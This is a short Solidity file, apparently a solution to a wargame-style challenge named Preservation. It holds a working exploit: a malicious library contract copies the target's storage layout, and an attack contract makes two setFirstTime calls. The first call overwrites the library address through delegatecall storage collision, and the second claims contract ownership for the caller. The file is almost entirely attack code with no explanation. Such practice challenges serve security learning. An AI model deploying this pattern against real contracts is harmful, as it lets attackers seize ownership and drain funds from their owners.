pragma solidity 0.8.4;
import "hardhat/console.sol";

interface PreservationInterface{
    function setFirstTime(uint _timeStamp) external;
}

contract ExploitLib{
    // Variables & Declarations (Same Number of Variables with the Preservation.sol)
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 


    // Methods
    function setTime(uint _time) public { // Malicious
        owner = tx.origin;
    }
}

contract PreservationExploit{
    // Variables & Declarations 
    address preservationAddr;
    ExploitLib exploitLibrary;

	// Constructor
	constructor(address _addr) public{
        preservationAddr = _addr;
        exploitLibrary = new ExploitLib();
    }

    // Methods
    function attack() public {
        // Access to Target
        PreservationInterface pi = PreservationInterface(preservationAddr);

        //  By Benefiting From  delegatecall Change Library to Malicious One
        pi.setFirstTime( uint256( uint160( address(exploitLibrary) ) ) );

        // Claim contract Ownership
        pi.setFirstTime(0);
    }

}